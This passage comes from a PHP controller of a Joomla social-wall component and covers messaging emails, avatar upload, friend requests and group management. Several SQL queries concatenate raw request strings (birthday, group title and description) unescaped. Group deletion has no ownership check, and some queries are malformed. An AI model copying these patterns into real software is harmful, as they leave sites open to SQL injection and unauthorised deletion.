href="'.$reciverurl.'" title="'.$rName.'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-right:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td ><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px 0px;">'.$emailtext1.'</td></tr></tbody></table></td></tr></tbody></table></td><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="border-width:1px;border-style:solid;border-color:#E3C823;background-color:#FFF9D9"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:2px 6px 4px;border-top:1px solid #fff"><a target="_blank" style="color:#6176b7;text-decoration:none" href="'.$walllink.'"><span style="font-weight:bold;white-space:nowrap;color:#3b5b98;font-size:11px">'.$emailtext2.'</span></a></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';			
			
			

				$body = $emailcontent;
				$mailer = & JFactory::getMailer();
				$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
				$mailer->setSubject(JText::_($mainframe->getCfg('fromname').' '.JText::sprintf('COM_COMAWDWALL_EMAIL_SUBJECT_NEW_PM', $sName)));
				$mailer->setBody($body);
				$mailer->IsHTML(1);
				$mailer->addRecipient($receiver->email);
				$rs = $mailer->Send();		

			}
			// prepend html to main wall
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('pm_user_block');
			$view->setModel($wallModel);
			$view->getPMUserBlock();
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId, false), JText::_('Need to login'));
		}
		exit;
	}
	
	function uploadAvatar()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_avatar');
		$view->avatar();
	}
	
	function saveAvatar()
	{
		//echo "i m here";
		$mainframe= JFactory::getApplication(); 
		$user = &JFactory::getUser();
		$userId = $user->id;
		$itemId =  AwdwallHelperUser::getComItemId();
		$db =& JFactory::getDBO();
		if((int)$userId > 0){
			require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');			
			$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
			$image 	= JRequest::getVar('avatar', null, 'files', 'array');
			$gender = JRequest::getInt('gender', null);
			$birthday = JRequest::getString('birthday', null);
			$aboutme  = JRequest::getString('aboutme', null);
				$max_upload = (int)(ini_get('upload_max_filesize'));
				$inputsize=$image['size'];
				$inputsize=AwdwallHelperUser::mbFormat($inputsize,1);
				//echo $max_upload.'<br>'.$inputsize;
				//exit;
				if($inputsize > $max_upload )
				{
					$msg=JText::_('UPLOAD FILE SIZE');
					$mainframe->Redirect(JRoute::_('index.php?option=com_awdwall&task=uploadavatar&Itemid='.$itemId, false), JText::_('UPLOAD FILE SIZE'));
				}
			if($image['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($image['name']);
				$fileName = str_replace(' ', '_', $fileName);
				$src 	= $image['tmp_name'];
				$dest 	= 'images' . DS . 'wallavatar' . DS . $userId . DS . 'original' . DS . $fileName; 
				
				if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
				   require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'class.upload.php');	
				   $handle = new upload($_FILES['avatar']);
				   if ($handle->uploaded) {
				   
						$filename = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
						$filename1 = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'original';
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_y        = true;
						$handle->image_x               = 133;
						
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'thumb';
						$filename='tn133'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 51;
						$handle->image_y               = 51;
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'thumb';
						$filename='tn51'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 40;
						$handle->image_y               = 40;
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'thumb';
						$filename='tn40'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 32;
						$handle->image_y               = 32;
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'thumb';
						$filename='tn32'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 19;
						$handle->image_y               = 19;
						$folder='images' . DS . 'wallavatar' . DS . $userId . DS . 'thumb';
						$filename='tn19'.$filename1;
						processthumb($handle,$filename,$folder);
						
				   }
					
					
					
					
				}else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid=' . $itemId, false));
				}
			}
			
			// check if user is exist or not
			$sql = 'SELECT user_id FROM #__awd_wall_users WHERE user_id = ' . (int)$userId;
			$db->setQuery($sql);
			$result = $db->loadResult();
			if($result){
				// update into wall table first
				if($fileName != '')
					$sql = 'UPDATE #__awd_wall_users SET avatar = "' . $fileName . '", gender = ' . $gender . ', birthday = "' . $birthday . '" WHERE user_id = ' . (int)$userId;
				else
					$sql = 'UPDATE #__awd_wall_users SET gender = ' . $gender . ', birthday = "' . $birthday . '" WHERE user_id = ' . (int)$userId;
				$db->setQuery($sql);
				$db->query();
			}else{
				// save into wall table first
				$sql = 'INSERT INTO #__awd_wall_users (user_id, avatar, gender, birthday) VALUES("' . $userId . '","'.$fileName . '", "' . $gender . '", "' . $birthday . '")';
				$db->setQuery($sql);
				$db->query();
			}
			
			
			if($fileName)
			{
			// store into wall
			$Itemid = AwdwallHelperUser::getComItemId();
			$wall 				=& JTable::getInstance('Wall', 'Table');						
			$wall->user_id		= $userId;
			$wall->type			= 'text';
			$wall->commenter_id	= $userId;
			$wall->user_name	= '';
			$wall->avatar		= '';
			$wall->message		= JText::_('UPDATED AVATAR');
			$wall->reply		= 0;
			$wall->is_read		= 0;
			$wall->is_pm		= 0;
			$wall->is_reply		= 0;
			$wall->posted_id	= NULL;
			$wall->wall_date	= time();
			// store wall to database
				if (!$wall->store()){				
		
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
				}
			}
			else
			{
				// store into wall
				$Itemid = AwdwallHelperUser::getComItemId();
				$wall 				=& JTable::getInstance('Wall', 'Table');						
				$wall->user_id		= $userId;
				$wall->type			= 'text';
				$wall->commenter_id	= $userId;
				$wall->user_name	= '';
				$wall->avatar		= '';
				$wall->message		= JText::_('UPDATED PROFILE');
				$wall->reply		= 0;
				$wall->is_read		= 0;
				$wall->is_pm		= 0;
				$wall->is_reply		= 0;
				$wall->posted_id	= NULL;
				$wall->wall_date	= time();
	
				// store wall to database
					if (!$wall->store()){				
			
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
					}
			}
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid=' . $itemId, false));
		}
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=mywall&Itemid=' . $itemId, false));
	}
	
	function addFriend()
	{
		$mainframe	=& JFactory::getApplication();
		$wuid = JRequest::getInt('user_to', null);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
		$sql = 'INSERT INTO #__awd_connection (connect_from, connect_to, status, pending, msg, created) VALUES("' . $user->id . '","' . $wuid . '", 1, 1, " ", "' . time() . '")';
		$db->setQuery($sql);
		$db->query();
		$sql = 'INSERT INTO #__awd_connection (connect_from, connect_to, status, pending, msg, created) VALUES("' . $wuid . '","' . $user->id . '", 0, 0, "", "' . time() . '")';
		$db->setQuery($sql);
		$db->query();
		// for cb
		$accepted=1;
		$pending=1;
		$sql="INSERT INTO #__comprofiler_members (referenceid,memberid,accepted,pending,membersince,reason) VALUES (" . (int) $user->id . "," . (int) $wuid . "," . (int) $accepted . "," . (int) $pending.",CURDATE(),'')";
		$db->setQuery($sql);
		$db->query();
		$accepted=0;
		$pending=0;
		$sql="INSERT INTO #__comprofiler_members (referenceid,memberid,accepted,pending,membersince,reason) VALUES (" . (int) $wuid . "," . (int) $user->id . "," . (int) $accepted . "," . (int) $pending.",CURDATE(),'')";
		$db->setQuery($sql);
		$db->query();
		//insert into awd_wall_notification table.
		
		$ndate=date("Y-m-d H:i:s");
		$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $wuid . '", "' . $user->id . '", "friend", "", ""," ", "","0")';
		$db->setQuery($query);
		$db->query();
		// send email requess
$itemId = AwdwallHelperUser::getComItemId();
$wuser = &JFactory::getUser($wuid);
$rName =  AwdwallHelperUser::getDisplayName($wuid);
$sName =  AwdwallHelperUser::getDisplayName($user->id);				
$sitename=$mainframe->getCfg('fromname');
$siteaddress=JURI::base();
$useravatarimage=AwdwallHelperUser::getBigAvatar51($user->id);
$emailgreeting=JText::sprintf('COM_COMAWDWALL_EMAIL_GREETING', $rName);
$emailbody=JText::sprintf('COM_COMAWDWALL_EMAIL_REQUEST_FRIEND',$sName,$siteaddress);	
$emailtext1=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_VIEW_CONVERSATION');	
$emailtext2=JText::_('COM_COMAWDWALL_EMAIL_NEW_POST_SEE_POST');
$emailfooter=JText::sprintf('COM_COMAWDWALL_EMAIL_FOOTER',$siteaddress,$sitename);	
$reciverurl=JURI::base().'index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid='.$itemId;
$emailcontent='<table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="font-size:16px;font-family:lucida grande,tahoma,verdana,arial,sans-serif;background:#313131;color:#ffffff;font-weight:bold;vertical-align:baseline;letter-spacing:-0.03em;text-align:left;padding:10px 38px 4px"><a target="_blank" href="'.$siteaddress.'" style="text-decoration:none" title="'.$siteaddress.'"><span style="background:#313131;color:#ffffff;font-weight:bold;font-family:lucida grande,tahoma,verdana,arial,sans-serif;vertical-align:middle;font-size:16px;letter-spacing:-0.03em;text-align:left;vertical-align:baseline"><span class="il">'.$sitename.'</span></span></a></td></tr></tbody></table><table cellspacing="0" cellpadding="0" style="border-collapse:collapse;width:620px"><tbody><tr><td style="border-right:1px solid #ccc;color:#333333;font-size:11px;border-bottom:1px solid #ccc;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;border-top:1px solid #ccc;padding:10px 25px;border-left:1px solid #ccc; background-color:#f7f7f7"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:10px 25px;color:#333333;width:620px"><table width="100%" cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding-bottom:10px"><table cellspacing="0" cellpadding="0" style="border-collapse:collapse"><tbody><tr><td colspan="2" valign="top" style="height:30px;"><span style="font-size:13px;">'.$emailgreeting.'</span></td></tr><tr><td valign="top" style="width:100%;"><span style="font-size:13px">'.$emailbody.'</span></td><td valign="top" style="padding-right:10px;font-size:0px"><a target="_blank" style="color:#3b5998;text-decoration:none" href="'.$reciverurl.'" title="'.$sName .'"><img style="border:0" src="'.$useravatarimage.'"  /></a></td></tr></tbody></table></td></tr><tr><td style="font-size:11px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif"><table cellspacing="0" cellpadding="0" border="0" style="border-collapse:collapse;width:100%"><tbody><tr><td>&nbsp;</td></tr><tr><td style="font-size:13px;font-family:LucidaGrande,tahoma,verdana,arial,sans-serif;padding:0px;border-left:none;border-right:none;">'.$emailfooter.'</td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody></table>';
				$body = $emailcontent;				 
		$mailer = & JFactory::getMailer();
		$mailer->setSender(array($mainframe->getCfg('mailfrom'), $mainframe->getCfg('fromname')));
		$mailer->setSubject(JText::sprintf('EMAIL REQUEST FRIEND SUBJECT', $sName));
		$mailer->setBody($body);
		$mailer->IsHTML(1);
		$mailer->addRecipient($wuser->email);
		$rs = $mailer->Send();		
		exit;
	}
	
	function viewFriends()
	{
		$user 		= &JFactory::getUser();		
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel = $this->getModel('wall');
		$itemId = AwdwallHelperUser::getComItemId();				
		if((int)$user->id){
			// prepend html to main wall		
			$view  = &$this->getView('awdwall', 'html');
			$view->setLayout('my_friends');
			$view->setModel($wallModel);
			$view->viewFriends();
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId, false), JText::_('Need to login'));
		}
	}
	
	function acceptFriend()
	{
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		
		$itemId = AwdwallHelperUser::getComItemId();
		
		$userTo = JRequest::getInt('user_to', null);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
		$sql = 'UPDATE #__awd_connection SET status = 1, created = "' . time() . '" WHERE connect_from = ' . (int)$user->id . ' AND connect_to = ' . (int)$userTo;
		$db->setQuery($sql);
		$db->query();
		$sql = 'UPDATE #__awd_connection SET pending = 0 WHERE connect_from = ' . (int)$userTo . ' AND connect_to = ' . (int)$user->id;
		$db->setQuery($sql);
		$db->query();
		// for cb
		$sql="update #__comprofiler_members set accepted=1,pending=0 where referenceid='".(int) $user->id ."' and memberid='".(int) $userTo ."'";
		$db->setQuery($sql);
		$db->query();
		$sql="update #__comprofiler_members set accepted=1,pending=0 where referenceid='".(int) $userTo ."' and memberid='".(int) $user->id ."'";
		$db->setQuery($sql);
		$db->query();
		// store into wall
		$Itemid = AwdwallHelperUser::getComItemId();
		$wall 				=& JTable::getInstance('Wall', 'Table');						
		$wall->user_id		= $user->id;
		$wall->type			= 'friend';
		$wall->commenter_id	= $userTo;
		$wall->user_name	= '';
		$wall->avatar		= '';
		$wall->message		= '';
		$wall->reply		= 0;
		$wall->is_read		= 0;
		$wall->is_pm		= 0;
		$wall->is_reply		= 0;
		$wall->posted_id	= NULL;
		$wall->wall_date	= time();
		// store wall to database
		if (!$wall->store()){				
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
		}
		//insert into awd_wall_notification table.
		
		$ndate=date("Y-m-d H:i:s");
		$query = 'INSERT INTO #__awd_wall_notification(ndate, nuser, ncreator, ntype, nwallid, ngroupid, nphotoid, nalbumid, nread) VALUES( "'.$ndate.'" , "' . $userTo . '", "' . $user->id . '", "friend", "", ""," ", "","0")';
		$db->setQuery($query);
		$db->query();
		exit;
	}
	
	function denyFriend()
	{
		$userTo = JRequest::getInt('user_to', null);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
		$sql = 'DELETE FROM #__awd_connection WHERE connect_from = ' . (int)$user->id . ' AND connect_to = ' . (int)$userTo;
		$db->setQuery($sql);
		$db->query();
		$sql = 'DELETE FROM #__awd_connection WHERE connect_from = ' . (int)$userTo . ' AND connect_to = ' . (int)$user->id;
		$db->setQuery($sql);
		$db->query();
		
		// for cb
		$sql="DELETE FROM #__comprofiler_members where referenceid='".(int) $user->id ."' and memberid='".(int) $userTo ."'";
		$db->setQuery($sql);
		$db->query();
		$sql="DELETE #__comprofiler_members referenceid='".(int) $userTo ."' and memberid='".(int) $user->id ."'";
		$db->setQuery($sql);
		$db->query();
		exit;
	}
	
	function getMoreFriends()
	{
		$user 	= &JFactory::getUser();
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel 	= $this->getModel('wall');
		$view  		= &$this->getView('awdwall', 'html');
		$view->setLayout('more_friends');
		$view->setModel($wallModel);
		$view->getMoreFriends();
		exit;
	}
	
	function deleteFriend()
	{
		$userTo = JRequest::getInt('user_to', null);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
		$sql = 'DELETE FROM #__awd_connection WHERE connect_from = ' . (int)$user->id . ' AND connect_to = ' . (int)$userTo;
		$db->setQuery($sql);
		$db->query();
		$sql = 'DELETE FROM #__awd_connection WHERE connect_from = ' . (int)$userTo . ' AND connect_to = ' . (int)$user->id;
		$db->setQuery($sql);
		$db->query();
		// for cb
		$sql="DELETE FROM #__comprofiler_members where referenceid='".(int) $user->id ."' and memberid='".(int) $userTo ."'";
		$db->setQuery($sql);
		$db->query();
		$sql="DELETE #__comprofiler_members referenceid='".(int) $userTo ."' and memberid='".(int) $user->id ."'";
		$db->setQuery($sql);
		$db->query();
		
		
		exit;
	}
	
	function newGroup()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_newgroup');
		$view->newGroup();
	}
	
	function saveGroup()
	{
		JRequest::checkToken() or die( 'Invalid Token' );
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');			
		$itemId = AwdwallHelperUser::getComItemId();
		//$itemId=$_REQUEST['Itemid'];
		$user 		= &JFactory::getUser();			
		$db 		= &JFactory::getDBO();
		$groupTitle = JRequest::getString('group_title', '');
		$groupDes  	= JRequest::getString('group_description', '');
		$privacy	= JRequest::getInt('group_type', 1);
		$groupId	= JRequest::getInt('awd_group_id', 0);
		if($groupId==0)
		{
			$newgrp=1;
		}
		else
		{
			$newgrp=0;
		}
			
		if((int)$user->id){
			// upload image
			$arrExt 	= explode(',', AwdwallHelperUser::getImageExt());
			$image 	= JRequest::getVar('awd_group_image', null, 'files', 'array');
			$fileName = '';
			$des = '';
			if($image['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($image['name']);
				$fileName = str_replace(' ', '_', $fileName);
				$src 	= $image['tmp_name'];
				$dest 	= 'images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'original' . DS . $fileName; 
			}
			if($groupId == 0){
				$query = "INSERT INTO #__awd_groups(creator, title, description, privacy, image, created_date) VALUES(" . $user->id . ", '" . $groupTitle . "', '" . $groupDes . "', ". $privacy .", '" . $fileName . "', '" . time() . "')";
			}else{
			
			if($fileName == ''){
				$fileName = JRequest::getString('awd_group_old_image', '');
			}
							
			$query = "UPDATE #__awd_groups SET title = '". $groupTitle ."', description = '" .$groupDes. "', privacy = " . $privacy . ", image='" . $fileName . "' WHERE id = " . $groupId;
			}
		
			$db->setQuery($query);			
			
			// store like to database
			if (!$db->query()){	
				$this->setRedirect(JRoute::_('index.php?option=com_awdwall&view=awdwall&layout=mywall&Itemid=' . $$itemId , false ), $db->getErrorMsg());		
			}
			if($groupId == 0)
				$groupId = $db->insertid();
			if($image['name'] != ''){
				jimport('joomla.filesystem.file');
				jimport('joomla.filesystem.folder');
				$time = time();
				//Clean up filename to get rid of strange characters like spaces etc
				$fileName = $time . '_' . JFile::makeSafe($image['name']);
				$fileName = str_replace(' ', '_', $fileName);
				$src 	= $image['tmp_name'];
				$dest 	= 'images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'original' . DS . $fileName; 
			}
			
			// upload
			if($image['name'] != ''){
			if(in_array(strtolower(JFile::getExt($fileName)), $arrExt)){
				   require_once (JPATH_COMPONENT . DS . 'libraries' . DS . 'class.upload.php');	
				   $handle = new upload($_FILES['awd_group_image']);
				   if ($handle->uploaded) {
				   
						$filename = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
						$filename1 = preg_replace("/\\.[^.\\s]{3,4}$/", "", $fileName);
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'original';
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 133;
						
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn133'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 51;
						$handle->image_y               = 51;
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn51'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 64;
						$handle->image_y               = 64;
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn64'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 40;
						$handle->image_y               = 40;
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn40'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 32;
						$handle->image_y               = 32;
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn32'.$filename1;
						processthumb($handle,$filename,$folder);
						
						$handle->image_resize          = true;
						$handle->image_ratio_crop      = true;
						$handle->image_x               = 19;
						$handle->image_y               = 19;
						$folder='images' . DS . 'awdgrp_images' . DS . $groupId . DS . 'thumb';
						$filename='tn19'.$filename1;
						processthumb($handle,$filename,$folder);
						
				   }
					
					
					
					
				}else {
					//Redirect and notify user file is not right extension
					$this->setRedirect(JRoute::_('index.php?option=com_awdwall&task=viewgroup&groupid=' . $groupId . '&Itemid='  . $itemId, false));
				}
			
			}
		}else{
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&layout=mywall&Itemid=' . $itemId, false), JText::_('Need to login'));
		}
					// store into wall
			if( $newgrp==1 && $groupId!=0)
			{		
				if($privacy==1)
				{
					
					$grplink=JRoute::_('index.php?option=com_awdwall&task=viewgroup&groupid=' . $groupId . '&Itemid='  . $itemId);
					
					
					
					$Itemid = AwdwallHelperUser::getComItemId();
					$wall 				=& JTable::getInstance('Wall', 'Table');						
					$wall->user_id		= $user->id ;
					$wall->type			= 'text';
					$wall->commenter_id	= $user->id;
					$wall->user_name	= '';
					$wall->avatar		= '';
					$wall->message		= JText::sprintf('HAS CREATED THE GROUP', $grplink, $groupTitle);	
					$wall->reply		= 0;
					$wall->is_read		= 0;
					$wall->is_pm		= 0;
					$wall->is_reply		= 0;
					$wall->posted_id	= NULL;
					$wall->wall_date	= time();
		
					// store wall to database
					if (!$wall->store()){				
						$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
					}
				}
			
			}
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&task=viewgroup&groupid=' . $groupId . '&Itemid='  . $itemId, false));
	}
	
	function groups()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel 	= $this->getModel('group');
	
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_groups');
		$view->setModel($groupModel);
		$view->groups();
	}
	
	function viewGroup()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');
		$wallModel = $this->getModel('wall');
		$groupModel = $this->getModel('group');
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_group_wall');
		$view->setModel($groupModel);
		$view->setModel($wallModel);
		$view->viewGroup();		
	}
	
	function joinGroup()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel = $this->getModel('group');
		$groupId	= JRequest::getInt('groupid', 0);
		$groupModel->joinGroup($groupId, $user->id);
		if($groupId==0)
		$groupId =NULL;
		// get group name
		$group = $groupModel->getGroupInfo($groupId);
		// add message to news feeds 
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'wall.php');	
		$wall 				=& JTable::getInstance('Wall', 'Table');						
		$wall->user_id		= $group->creator;
		$wall->group_id		= $groupId;
		$wall->type			= 'group';
		$wall->commenter_id	= $user->id;
		$wall->user_name	= '';
		$wall->avatar		= '';
		$wall->message		= '';
		$wall->reply		= 0;
		$wall->is_read		= 0;
		$wall->is_pm		= 0;
		$wall->is_reply		= 0;
		$wall->posted_id	= NULL;
		$wall->wall_date	= time();
		// store wall to database
		if (!$wall->store()){				
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='.$itemId , false ), JText::_('Post Failed'));
		}
		exit;
	}
	
	function groupSetting()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel 	= $this->getModel('group');
	
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_groupsetting');
		$view->setModel($groupModel);
		$view->groupSetting();
	}
	
	function deleteGroup()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel = $this->getModel('group');
		$groupId	= JRequest::getInt('awd_group_id', 0);
		$db =& JFactory::getDBO();
		$sql = 'DELETE FROM #__awd_groups_members WHERE group_id = ' . (int)$groupId;
		$db->setQuery($sql);
		$db->query();
		$sql = 'DELETE FROM #__awd_wall WHERE group_id = ' . (int)$groupId;
		$db->setQuery($sql);
		$db->query();
		$sql = 'DELETE FROM #__awd_groups WHERE id = ' . (int)$groupId;
		$db->setQuery($sql);
		$db->query();
		$this->setRedirect(JRoute::_('index.php?option=com_awdwall&task=groups&Itemid='	 . $itemId, false));
		
	}
	
	function inviteMembers()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel 	= $this->getModel('group');
	
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_grpinvite');
		$view->setModel($groupModel);
		$view->inviteMembers();
	}
	
	function grpMembers()
	{
		$user = &JFactory::getUser();
		$itemId = AwdwallHelperUser::getComItemId();
		if(!(int)$user->id){
			$this->setRedirect(JRoute::_('index.php?option=com_awdwall&&view=awdwall&layout=main&Itemid='	 . $itemId, false));
		}
		require_once (JPATH_COMPONENT . DS . 'models' . DS . 'group.php');
		$groupModel 	= $this->getModel('group');
	
		$view  = &$this->getView('awdwall', 'html');
		$view->setLayout('awd_grpmembers');
		$view->setModel($groupModel);
		$view->grpMembers();
	}
	
	function invite()
	{
		$mainframe	=& JFactory::getApplication();
		$groupId  = JRequest::getInt('groupid', null);
		$memberId = JRequest::getInt('userid', null);
		$user = &JFactory::getUser();
		$db =& JFactory::getDBO();
